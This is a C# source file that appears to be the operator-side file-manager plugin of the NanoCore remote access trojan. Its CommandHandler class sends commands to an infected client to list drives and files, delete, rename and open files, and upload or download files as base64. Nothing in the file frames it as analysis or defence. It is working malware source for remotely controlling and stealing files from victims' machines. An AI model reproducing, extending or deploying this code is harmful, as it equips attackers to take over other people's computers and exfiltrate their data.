using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using NanoCore;

namespace FileBrowserServer
{
    public sealed class CommandHandler
	{
		public static void HandleCurrentDirectory(object[] @params)
		{
			ServerMain.FileManager.txtRemoteDir.Text = Convert.ToString(@params[1]).Replace("\\..", string.Empty);
		}

		public static void HandleDownloadFile(object[] @params)
		{
			Functions.LogMessage(string.Format("Downloading '{0}'..", RuntimeHelpers.GetObjectValue(@params[2])));
			File.WriteAllBytes(Convert.ToString(@params[2]), Convert.FromBase64String(Convert.ToString(@params[1])));
			ServerMain.FileManager.btnRefreshLocal.PerformClick();
		}

		public static void HandleMachineName(object[] @params)
		{
			ServerMain.FileManager.Text = string.Format(ServerMain.FileManager.Text, @params[1].ToString());
		}

		public static void HandleRemoteDrives(object[] @params)
		{
			string[] array = @params[1].ToString().Split(new string[] { "|" }, StringSplitOptions.RemoveEmptyEntries);
			foreach (string text in array)
			{
				string[] array3 = text.Split(new string[] { "::" }, StringSplitOptions.RemoveEmptyEntries);
				ServerMain.FileManager.lvDrivesRemote.Items.Add(new ListViewItem(new string[] { array3[0] })
				{
					StateImageIndex = Convert.ToInt32(array3[1])
				});
			}
		}

		public static void HandleRemoteFiles(object[] @params)
		{
			try
			{
				ServerMain.FileManager.lvRemote.Items.Clear();
				ServerMain.FileManager.lvRemote.BeginUpdate();

				ServerMain.FileManager.lvRemote.Items.Add(new ListViewItem(new string[] { "..", "File folder" })
				{
					StateImageIndex = 0
				});

				string[] array = @params[1].ToString().Split(new string[] { "|" }, StringSplitOptions.RemoveEmptyEntries);
				foreach (string text in array)
				{
					if (text.Contains("1::"))
					{
						string[] array3 = text.Split(new string[] { "::" }, StringSplitOptions.None);
						if (array3.Length > 4)
							return;

						ListViewItem value = new ListViewItem(new string[]
						{
							array3[1],
							ServerMain.FileManager.ParseTypeName(array3[2]),
							string.Format("{0} KB", checked((long)Math.Round(Math.Ceiling(long.Parse(array3[3]) / 1024.0))))
						})
						{
							StateImageIndex = 1
						};
						ServerMain.FileManager.lvRemote.Items.Add(value);
					}
					else
					{
						ServerMain.FileManager.lvRemote.Items.Add(new ListViewItem(new string[]
						{
							text,
							"File folder"
						})
						{
							StateImageIndex = 0
						});
					}
				}
			}
			catch (Exception ex)
			{
			}
			finally
			{
				ServerMain.FileManager.lvRemote.EndUpdate();
			}
		}

		public static void SendCreateDirectory(IClient client, string directoryName)
		{
			ServerMain.NetworkHost.SendToClient(client, null, true, new object[]
			{
				CommandTypes.CreateDirectory,
				directoryName
			});
			SendGetRemoteFiles(client);
		}

		public static void SendDeleteFile(IClient client, bool isDirectory)
		{
			ServerMain.NetworkHost.SendToClient(client, null, true, new object[]
			{
				CommandTypes.Delete,
				ServerMain.FileManager.txtRemoteDir.Text + Convert.ToString(Path.DirectorySeparatorChar) + ServerMain.FileManager.lvRemote.SelectedItems[0].Text,
				isDirectory
			});
			SendGetRemoteFiles(client);
		}

		public static void SendDownloadFile(IClient client, string remoteFile)
		{
			string text = ServerMain.FileManager.txtLocalDir.Text + Convert.ToString(Path.DirectorySeparatorChar) + remoteFile.Substring(remoteFile.LastIndexOf("\\"));
			ServerMain.NetworkHost.SendToClient(client, null, true, new object[]
			{
				CommandTypes.Download,
				remoteFile,
				text
			});
		}

		public static void SendGetCurrentDirectory(IClient client)
		{
			ServerMain.NetworkHost.SendToClient(client, null, true, new object[]
			{
				CommandTypes.GetCurrentDirectory
			});
		}

		public static void SendGetMachineName(IClient client)
		{
			ServerMain.NetworkHost.SendToClient(client, null, true, new object[]
			{
				CommandTypes.MachineName
			});
		}

		public static void SendGetRemoteDrives(IClient client)
		{
			ServerMain.NetworkHost.SendToClient(client, null, true, new object[]
			{
				CommandTypes.Drives
			});
		}

		public static void SendGetRemoteFiles(IClient client)
		{
			ServerMain.NetworkHost.SendToClient(client, null, true, new object[]
			{
				CommandTypes.Files
			});
		}

		public static void SendOpenFile(IClient client, string fileName)
		{
			ServerMain.NetworkHost.SendToClient(client, null, true, new object[]
			{
				CommandTypes.Open,
				fileName
			});
		}

		public static void SendRename(IClient client, string oldFile, string newFile, bool isDirectory)
		{
			ServerMain.NetworkHost.SendToClient(client, null, true, new object[]
			{
				CommandTypes.Rename,
				oldFile,
				newFile,
				isDirectory
			});
			SendGetRemoteFiles(client);
		}

		public static void SendSetCurrentDirectory(IClient client, string path)
		{
			ServerMain.NetworkHost.SendToClient(client, null, true, new object[]
			{
				CommandTypes.SetCurrentDirectory,
				path
			});
		}

		public static void SendUploadFile(IClient client)
		{
			string path = ServerMain.FileManager.txtLocalDir.Text + Convert.ToString(Path.DirectorySeparatorChar) + ServerMain.FileManager.lvLocal.SelectedItems[0].Text;
			ServerMain.NetworkHost.SendToClient(client, null, true, new object[]
			{
				CommandTypes.Upload,
				Convert.ToBase64String(File.ReadAllBytes(path)),
				ServerMain.FileManager.txtRemoteDir.Text + Convert.ToString(Path.DirectorySeparatorChar) + ServerMain.FileManager.lvLocal.SelectedItems[0].Text
			});
			SendGetRemoteFiles(client);
		}
	}
}